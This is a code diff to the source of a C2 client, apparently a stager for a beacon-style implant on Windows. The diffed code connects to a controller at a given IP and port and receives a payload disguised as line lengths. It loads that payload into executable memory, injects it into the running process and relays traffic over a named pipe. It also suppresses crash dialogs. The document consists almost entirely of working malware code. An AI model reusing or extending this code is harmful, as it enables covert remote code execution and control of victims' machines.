@@ -218,7 +218,7 @@ char* encode_end_transmission() {
  */
 void main(int argc, char* argv[])
 {
-	printf("Running the file");
+	printf("Running the file\n");
 	// Set connection and IRC info
 	if (argc != 4)
 	{
@@ -226,10 +226,17 @@ void main(int argc, char* argv[])
 		printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR]");
 		exit(1);
 	}
+
+	//seed random number table
 	time_t time_seed;
 	srand((unsigned int) time(&time_seed));
 	
-	//seed random number table
+	// pointer to data received 
+	char* random_line = malloc(512*sizeof(unsigned char));
+	// Count of bytes recieved
+	DWORD byte_counter = 0;
+	// The decoded byte received 
+	unsigned char byte = 0;
 
 	// Disable crash messages
 	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
@@ -247,7 +254,7 @@ void main(int argc, char* argv[])
 
 	// Create a connection back to our C2 controller
 	SOCKET sockfd = INVALID_SOCKET;
-	printf("Creating socket");
+	printf("Creating socket\n");
 	sockfd = create_socket(IP, PORT);
 	if (sockfd == INVALID_SOCKET)
 	{
@@ -256,7 +263,7 @@ void main(int argc, char* argv[])
 	}
 
 	// Allocate data for receiving beacon payload
-	printf("running Virutal Alloc");
+	printf("running Virutal Alloc\n");
 	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (payload == NULL)
 	{
@@ -264,15 +271,23 @@ void main(int argc, char* argv[])
 		exit(1);
 	}
 
+	//Receive initial payload data
 	printf("Recieving initial payload data");
-	DWORD payload_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
-	if (payload_size < 0)
-	{
-		printf("recvData error, exiting\n");
-		free(payload);
-		exit(1);
+	DWORD read_size = recvData(sockfd, random_line, 512);
+	while (read_size != 100 && byte_counter < BUFFER_MAX_SIZE) {
+		if (read_size < 0)
+		{
+			printf("recvData error, exiting\n");
+			break; //TODO - free and exit
+		}
+		payload[byte_counter] = decode_length(random_line); //TODO - this is a touch inefficient. Maybe change it to just work with read_size?
+		byte_counter++;
+		memset(random_line, 0, 512);
+		read_size = recvData(sockfd, random_line, 512);
+		
 	}
-	printf("Recv %d byte payload from TS\n", payload_size);
+
+	printf("Recv %d byte payload from TS\n", byte_counter);
 	/* inject the payload stage into the current process */
 
 	printf("Injecting payload stage into current process.");
@@ -280,7 +295,7 @@ void main(int argc, char* argv[])
 	// Loop unstil the pipe is up and ready to use
 	while (beaconPipe == INVALID_HANDLE_VALUE) {
 		// Create our IPC pipe for talking to the C2 beacon
-		Sleep(5);
+		Sleep(50);
 		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
 		char pipestr[50+13]= "\\\\.\\pipe\\";
 		// Pipe str (i.e. "mIRC")
@@ -299,12 +314,16 @@ void main(int argc, char* argv[])
 		free(payload);
 		exit(1);
 	}
-	// pointer to payload strings 
-	char* random_line = NULL;
-	DWORD byte_counter = 0;
-	unsigned char byte = 0;
+
+	//free line
+	free(random_line);
+
+
+
 	// The pipe dance
 	while (1) {
+		byte_counter = 0;
+		byte = 0;
 		// Read frame
 		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
 		if (read_size < 0)
@@ -333,6 +352,7 @@ void main(int argc, char* argv[])
 		//Allocate space for random line
 		random_line = malloc(512*sizeof(unsigned char));
 		byte_counter = 0;
+		byte = 0;
 
 		//Read in data from server. 
 		read_size = recvData(sockfd, random_line, 512);
@@ -344,6 +364,7 @@ void main(int argc, char* argv[])
 			}
 			buffer[byte_counter] = decode_length(random_line); //TODO - this is a touch inefficient. Maybe change it to just work with read_size?
 			byte_counter++;
+			memset(random_line, 0, 512);
 			read_size = recvData(sockfd, random_line, BUFFER_MAX_SIZE);
 			
 		}
